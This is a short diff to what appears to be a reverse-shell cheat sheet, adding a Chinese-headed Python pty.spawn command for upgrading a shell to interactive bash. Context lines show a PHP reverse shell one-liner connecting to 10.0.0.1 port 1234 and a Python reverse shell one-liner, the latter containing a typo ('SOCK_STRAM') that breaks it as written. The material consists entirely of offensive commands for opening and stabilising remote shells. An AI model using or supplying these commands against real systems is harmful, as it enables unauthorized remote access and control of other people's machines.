@@ -65,6 +65,9 @@ php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
 ```python
 python -c "import os,socket,subprocess;s=socket.socket
 (socket.AF_INET,socket.SOCK_STRAM);s.connect(('ip',port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);"
+
+python3交互式shell
+python3 -c 'import pty; pty.spawn("/bin/bash")' 
 ```
 
 ### java
